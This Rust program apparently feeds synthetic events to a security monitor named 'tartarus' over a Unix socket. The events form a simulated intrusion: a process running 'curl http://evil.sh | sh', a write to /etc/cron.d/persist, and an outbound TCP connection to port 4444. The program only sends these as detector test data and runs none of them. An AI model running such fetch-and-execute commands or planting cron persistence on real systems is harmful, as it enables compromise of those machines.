use std::{
    io::{BufWriter, Write},
    os::unix::net::UnixStream,
};
use tartarus_proto::*;
fn main() {
    let events = vec![
        Event {
            pid: 1234,
            timestamp: 1_000_000,
            raw_event: RawEvent::Process(Process {
                command_line: "curl http://evil.sh | sh".to_string(),
                executable_path: "/usr/bin/curl".to_string(),
                parent_pid: Some(1),
            }),
        },
        Event {
            pid: 1234,
            timestamp: 2_500_000,
            raw_event: RawEvent::FileAccess(FileAccess {
                file_path: "/etc/cron.d/persist".to_string(),
                access_type: AccessType::Write,
            }),
        },
        Event {
            pid: 1234,
            timestamp: 4_100_000,
            raw_event: RawEvent::NetworkConnection(NetworkConnection {
                protocol: Protocol::Tcp,
                direction: Direction::Outgoing,
                local: "10.0.2.15:51234".parse().unwrap(),
                remote: "185.220.101.7:4444".parse().unwrap(),
            }),
        },
    ];

    let mut socket = BufWriter::new(UnixStream::connect("/tmp/tartarus.sock").unwrap());

    for event in &events {
        serde_json::to_writer(&mut socket, event).unwrap();
        socket.write_all(b"\n").unwrap();
    }
    socket.flush().unwrap();
}
